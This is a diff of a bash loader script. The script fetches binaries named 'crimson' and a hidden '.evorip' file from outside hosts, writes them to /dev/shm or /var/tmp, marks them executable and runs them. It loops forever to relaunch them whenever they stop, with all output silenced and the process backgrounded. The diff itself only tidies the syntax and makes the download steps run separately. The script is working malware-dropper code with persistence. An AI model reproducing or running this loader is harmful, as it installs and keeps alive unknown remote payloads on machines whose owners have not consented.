@@ -1,6 +1,6 @@
 #!/bin/bash
-(
 
+(
 if [ -w '/dev/shm' ]; then
   export dir='/dev/shm'
 elif [ -w '/var/tmp' ]; then
@@ -25,13 +25,15 @@ while true; do
         if [ "${arch}" = "x86_64" ]; then
             ${bin_command} https://cybercrim.es/crimson.x86
             chmod a+x ${dir}/crimson
-        elif [ "${arch}" = 'aarch64' ] ||[ "${arch}" = 'armv8l' ] ; then
+        elif [ "${arch}" = 'aarch64' ] || [ "${arch}" = 'armv8l' ]; then
             ${bin_command} https://cybercrim.es/crimson.arm
             chmod a+x ${dir}/crimson
         fi
-    elif [ ! -f "${dir}/.evorip" ]; then
-      ${mo2_command} https://openstorage.org/l1
-      chmod a+x ${dir}/.evorip
+    fi
+
+    if [ ! -f "${dir}/.evorip" ]; then
+        ${mo2_command} https://openstorage.org/l1
+        chmod a+x ${dir}/.evorip
     fi
 
     if ! pgrep -f '.evorip'; then
@@ -40,6 +42,8 @@ while true; do
     
     if ! pgrep -f 'crimson'; then
         cd ${dir} && ./crimson
+    fi
+    
     sleep 4
 done
 ) &>/dev/null &
